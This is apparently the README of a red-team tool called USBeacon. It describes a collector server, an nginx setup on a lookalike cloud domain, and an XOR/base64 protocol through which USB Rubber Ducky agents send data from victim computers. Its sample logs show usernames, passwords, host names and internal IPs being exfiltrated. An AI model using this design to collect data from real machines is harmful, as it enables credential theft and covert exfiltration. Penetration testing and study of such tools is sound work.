# USBeacon

Objective(s):
> A reference implementation of a simple protocol and an agent contract to collect and transfer information from a remote computer to a collector. Mostly designed to work around USB Rubber Duckies but may be used standalone. The goals are to support the lowest common protocols available to the agent tech stack (clear HTTP) and minimal encryption facilities (e.g. XOR in ntive VBScript) across the board of deployment context (OS, etc.).

### Architecture

![arch diagram](https://github.com/dsnezhkov/USBeacon/raw/master/docs/USBeacon.png "Arch Diagram")


### Backend
*Location*: `/backend`
*Goal*: Stand up a collector application and store collected data in a simple database table



A. Init database: 
`python initdb.py`
```
CREATE TABLE beacon (
        id INTEGER NOT NULL,
        hashid VARCHAR(8),
        app VARCHAR(2),
        ip VARCHAR(16),
        data TEXT,
        created_at DATETIME,
        PRIMARY KEY (id)
);
```
B. Reference dependencies needed
`scripts/setup.sh`

Sample Nginx config:
```
server {
        listen 80;
        listen 443 ssl;
        server_name *.awsbuckets.online;


        ssl_certificate /etc/letsencrypt/live/<domain>/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/<domain?/privkey.pem;
        ssl_session_timeout 5m;
        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
        ssl_ciphers ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv3:+EXP;
        ssl_prefer_server_ciphers on;



        # Handle all locations
        location ~ ^/(beacon|ebeacon)/ {
                # Pass the request to Gunicorn
                proxy_pass http://127.0.0.1:8000;

                # Set some HTTP headers so that our app knows where the
                # request really came from
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
}
```
C. Start application proxied by Nginx
`scripts/start_server.sh`

### Payload Frontend Apps
Location: `/frontend`
*Goal*: Examples of code for the collecting agent running on the remote computers (Mac/Windows) and establishing communication from the agent to the collector


### Agent Provisioning 
*Location*: `/provisioning`
*Goal*: Help with USB RD provisioning (e.g firmware flashing, agent payload placement, etc.) 

### Protocol
```
Agent: base64(dec_array(xor(key, binary(bytes)))) 
Collector: ^^ reverse
```

Protocol examples (logs):
```
<Beacon: [hashid=53414C45532D5043, app=phs, ip=127.0.0.1, data=user:SM\test,pass:test] @ August 14 2019 - 05:48PM>
127.0.0.1 - - [14/Aug/2019:17:48:09 +0000] "POST /ebeacon/53414C45532D5043 HTTP/1.0" 200 0 "-" "-"
B64 Encoded: NDUsNjMsNTAsNTksNDUsODMsNDYsNjEsMzQsMTgsMzEsMjgsMzIsNDUsNjMsNTAsNTksNDUsODMsNDYsNjEsMzIsNzksNzEsNzYsODAsNzksNzIsNzAsODAsNzksNzEsNzEsODAsNzksNzcsNzQsMzI=
B64 Decoded: 45,63,50,59,45,83,46,61,34,18,31,28,32,45,63,50,59,45,83,46,61,32,79,71,76,80,79,72,70,80,79,71,71,80,79,77,74,32
Plain Payload: SALES-PC\lab^SALES-PC^192.168.1.1^

<Beacon: [hashid=53414C45532D5043, app=hid, ip=127.0.0.1, data=SALES-PC\lab^SALES-PC^192.168.1.1^] @ August 14 2019 - 06:18PM>
127.0.0.1 - - [14/Aug/2019:18:18:39 +0000] "POST /ebeacon/53414C45532D5043 HTTP/1.0" 200 0 "-" "-"
B64 Encoded: MTEsMTMsMjcsMTIsNjgsODIsMTQsMzEsMTMsMTMsNjg=
B64 Decoded: 11,13,27,12,68,82,14,31,13,13,68
Plain Payload: user:,pass:
```
